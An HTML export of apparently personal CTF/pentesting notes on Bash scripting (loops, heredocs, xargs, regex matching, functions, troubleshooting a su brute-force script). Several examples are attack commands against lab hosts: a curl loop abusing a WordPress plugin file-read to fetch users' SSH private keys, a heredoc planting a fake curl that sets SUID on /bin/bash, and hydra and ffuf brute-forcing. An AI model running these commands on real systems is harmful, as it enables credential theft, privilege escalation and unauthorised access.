<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shell (Bash)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shell (Bash)</h1><br/><p><h1>Loops</h1></p><p><h2>for Loop</h2></p><p><h3>for Each String</h3></p><p><em>array=(&quot;word&quot; &quot;space here&quot; &quot;example&quot;); for i in &quot;${array[@]}&quot;; do  echo $i; done</em></p><p></p><p><em>array=(&quot;id_rsa&quot; &quot;id_ecdsa&quot; &quot;id_dsa&quot;); for i in &quot;${array[@]}&quot;; do for u in $(cat users.txt); do echo &quot;User: $u Key: $i&quot;; curl &quot;http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=file:///home/$u/.ssh/$i&quot;; done; done</em></p><p></p><p><h3>for Each File</h3></p><p><em>for i in $(ls -a ./dir/); do cat ./dir/$i; done</em></p><p></p><p><h1>Input Redirection</h1></p><p>[HW 62]</p><p><h2>Heredoc</h2></p><p>A Heredoc (aka here-string, here-tag, hereis, etc) is a type of redirection where multiple lines of input are passed into a command.</p><p></p><p>Any string can be used to signal the end of input, but <strong>EOF</strong> (End Of File) is convention. This string (i.e EOF) won&#39;t be passed into the command!</p><p></p><p><h3>Writing to a File</h3></p><p>Useful when shell isn&#39;t stable enough to use a text editor (e.g vim), but you want to write multiple lines to a file. Use <strong>cat</strong> to create new file or append to existing file.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: This is also useful for writing text to a file that contains single &amp; double quotes, without having to worry about quote nesting.</p><p></p><p><em>cat &lt;&lt; EOF &gt;&gt; /home/kenobi/bin/curl</em><em></em></p><p><em>#!/bin/bash</em><em></em></p><p><em>chmod u+s /bin/bash</em><em></em></p><p><em>EOF</em></p><p></p><p><h2>Executing Commands from STDIN </h2></p><p>Depending on the tool you&#39;re using, 1 or both of the following methods may not work.</p><p></p><p><a name="xargs"></a><h3>xargs</h3></p><p><strong>xargs</strong> reads items from the standard input, and executes the command one or more times with any initial-arguments followed by items read from standard input.</p><p></p><p>This lets you pipe output into tools which don&#39;t have a built-in option to handle redirection from STDIN. For example,</p><p></p><p><em>cat /tmp/wordlist.txt | xargs -I % hydra -l username -p % target.com http-get</em></p><p></p><p><em>curl http://adana.thm/announcements/wordlist.txt | xargs -I % hydra -l hakanbey01 -p % -f adana.thm ftp</em></p><p></p><p><a name="Minus Symbol"></a><h3>Minus Symbol ( - )</h3></p><p>It&#39;s common convention (not something that&#39;s actually enforced by the shell) for the minus symbol to represent either <strong>STDIN</strong> or <strong>STDOUT</strong>, depending on the context that it was used in.</p><p></p><p>Tools will often support the use of <strong>-</strong> to either read from <strong>STDIN</strong> or write to <strong>STDOUT</strong>. For example, <strong>ffuf</strong> will read a wordlist from RAM &amp; <strong>tar</strong> will print output to the screen.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Setting up a command to print to <strong>STDOUT</strong> is useful for <span style="color:#ff0000;">piping that output into another command</span>!</p><p></p><p><em>curl http://adana.thm/announcements/wordlist.txt | ffuf -c -u &quot;http://adana.thm&quot; -w - -H &quot;Host: FUZZ.adana.thm&quot; -fw 459,205</em></p><p></p><p><em>tar -cvf - /path/to/dir | gzip &gt; archive.tar.gz</em></p><p></p><p><h1>Conditionals</h1></p><p><h2>Regex Matching ( =~ )</h2></p><p>The <strong>=~ </strong>operator in Bash is used to perform regular expression matching. It allows you to check if a string matches a given regular expression pattern.</p><p></p><p>It uses the syntax <strong>string =~ pattern</strong> where <strong>string</strong> is the string you&#39;re checking &amp; <strong>pattern</strong> is the regular expression pattern you&#39;re matching against.</p><p></p><p>If the string matches the pattern, the expression returns <strong>true</strong>; otherwise, it returns <strong>false</strong>. It <span style="color:#ff0000;">doesn&#39;t perform string comparison</span>; rather, it checks if the string matches the pattern defined by the regular expression.</p><p></p><p><em>string=&quot;http://example.com&quot;</em><em></em></p><p><em></em><em></em></p><p><em># Check if the string starts with &quot;http://&quot; or &quot;https://&quot;</em><em></em></p><p><em>if [[ &quot;$string&quot; =~ ^https?:// ]]; then</em><em></em></p><p><em>    echo &quot;This is a full URL starting with http:// or https://&quot;</em><em></em></p><p><em>else</em><em></em></p><p><em>    echo &quot;This is not a full URL&quot;</em><em></em></p><p><em>fi</em></p><p></p><p><h1>Functions</h1></p><p><h2>Passing Arguments</h2></p><p>Normally, bash interprets <strong>$1</strong> as the first argument given when invoking the script (i.e. <em>./script.sh </em><em><strong>http://example.com</strong></em>).</p><p></p><p>However, when used inside a function, <strong>$1</strong> means the first argument.</p><p></p><p><strong>upload_file() {</strong><strong></strong></p><p><strong>	local filename=&quot;</strong><strong><span style="color:#ff0000;">$1</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>	.....</strong><strong></strong></p><p><strong>}</strong><strong></strong></p><p><strong>	</strong><strong></strong></p><p><strong>filename=&quot;testfile.$ext&quot;</strong><strong></strong></p><p><strong>upload_file “</strong><strong><span style="color:#ff0000;">$filename</span></strong><strong>”</strong></p><p></p><p><h1>Troubleshooting</h1></p><p><a name="Broken pipe"></a><h2>echo: write error: Broken pipe</h2></p><p><h3>Effect of Error</h3></p><p>This error does not necessarily mean the entire script isn&#39;t working. For example, see <a href="https://github.com/carlospolop/su-bruteforce/tree/master">su-bruteforce</a>. The script could still function correctly in terms of trying passwords, even if it shows this warning message.</p><p></p><p>The error is more about how output is being handled during the execution. The script will likely continue trying the next password or user without stopping unless another error halts the process.</p><p></p><p>However, it could mean that the output might not be printed as expected. This means that the script <span style="color:#ff0000;">may not print the correct password</span> &amp; <span style="color:#ff0000;">may not stop bruteforcing after valid credentials are found</span>!</p><p></p><p><h3>Potential Causes</h3></p><p>This could be occuring because of a problem with the echo command trying to write to a pipe when the receiving end of the pipe (the process reading from it) has closed or terminated early.</p><p></p><p><span class="subheading">Parallel Execution</span>: The wait command is waiting for all the background processes to complete. However, in between, some of the background processes might attempt to write to a closed or terminated pipe, causing the error.</p><p></p><p><span class="subheading">Background Processes</span>: You&#39;re launching background processes with <strong>su_try_pwd $USER $P &amp;</strong>, which means those processes are running concurrently. These processes might be trying to print results (with echo) to a pipe.</p><p></p><p>However, if the pipe is closed or there&#39;s no consumer on the other end of the pipe (e.g. the terminal is closed or another issue occurs), you get a &quot;broken pipe&quot; error.</p><p></p><p>You&#39;re running <strong>echo</strong> within a background process (<strong>su_try_pwd</strong>), and there might be a situation where the process that echo is trying to write to (e.g. with <strong>sed</strong>) is no longer available when it tries to send output.</p><p></p><p><h3>Possible Solutions</h3></p><p><span class="subheading">Redirect echo output to a file or log</span>: Instead of letting echo write directly to standard output, you can redirect it to a file or log to avoid interference with the pipes.</p><p></p><p><em>echo &quot;  You can login as $USER using password: $PASSWORDTRY&quot; | sed &quot;s,.*,${C}[1;31;103m&amp;${C}[0m,&quot; &gt;&gt; brute_force_log.txt</em></p><p></p><p><span class="subheading">Use tee</span>: You can use <strong>tee</strong> to ensure the output is written to both standard output and a file. This is useful when you want to keep the log and still print to the terminal.</p><p></p><p><em>echo &quot;  You can login as $USER using password: $PASSWORDTRY&quot; | sed &quot;s,.*,${C}[1;31;103m&amp;${C}[0m,&quot; | tee -a output.log</em></p><p></p><p><span class="subheading">Check the background processes</span>: Ensure that the background processes don&#39;t close their standard output prematurely or that they are synchronized properly.</p><p></p><p>Sometimes, when too many processes are launched in parallel, they can interfere with each other’s output.</p><p></p><p>You might want to control the number of background processes with <a href="Appendix--Code--Shell_(Bash)_84.html#xargs">xargs</a> or <strong>parallel</strong> to reduce the likelihood of such issues.</p></div>
</body>
</html>
